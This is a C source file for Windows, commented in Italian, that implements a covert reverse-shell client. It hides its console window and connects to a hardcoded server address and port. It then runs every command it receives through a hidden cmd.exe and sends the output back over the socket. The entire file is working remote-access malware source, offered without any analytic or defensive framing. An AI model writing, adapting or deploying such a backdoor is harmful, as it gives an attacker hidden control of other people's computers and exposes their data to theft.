#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "Ws2_32.lib")

#define BUFFER_SIZE 1024


const char* ip = "127.0.0.1";
int PORT = 8888;


int execute_command_silently(const char *cmd, char *output, int max_len)
{
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &saAttr, 0)) return -1;

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;  // Nasconde la finestra

    char cmdLine[MAX_PATH + 10];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", cmd);

    BOOL success = CreateProcessA(
        NULL,
        cmdLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    CloseHandle(hWrite);
    if (!success) {
        CloseHandle(hRead);
        return -1;
    }

    DWORD bytesRead = 0;
    BOOL done = FALSE;
    int totalRead = 0;

    while (!done && totalRead < max_len - 1) {
        if (!ReadFile(hRead, output + totalRead, max_len - 1 - totalRead, &bytesRead, NULL) || bytesRead == 0) {
            done = TRUE;
        } else {
            totalRead += bytesRead;
        }
    }
    output[totalRead] = '\0';

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    return 0;
}



int main()
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);  // Nasconde la finestra della console

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    char recvbuf[BUFFER_SIZE + 1];
    char sendbuf[BUFFER_SIZE * 4]; // output può essere più grande
    int result;

    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        printf("Errore WSAStartup\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Errore socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Errore connect: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Connesso al server.\n");

    while (1) {
        // Aspetta comando dal server
        result = recv(sock, recvbuf, BUFFER_SIZE, 0);
        if (result <= 0) {
            printf("Connessione chiusa o errore\n");
            break;
        }
        recvbuf[result] = '\0';

        // Esegui il comando ricevuto
        if (execute_command_silently(recvbuf, sendbuf, sizeof(sendbuf)) == 0) {
            // Manda output al server + segnale di fine
            strcat(sendbuf, "__END__");
            send(sock, sendbuf, (int)strlen(sendbuf), 0);
        } else {
            const char *err = "Errore nell'esecuzione del comando\n__END__";
            send(sock, err, (int)strlen(err), 0);
        }
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
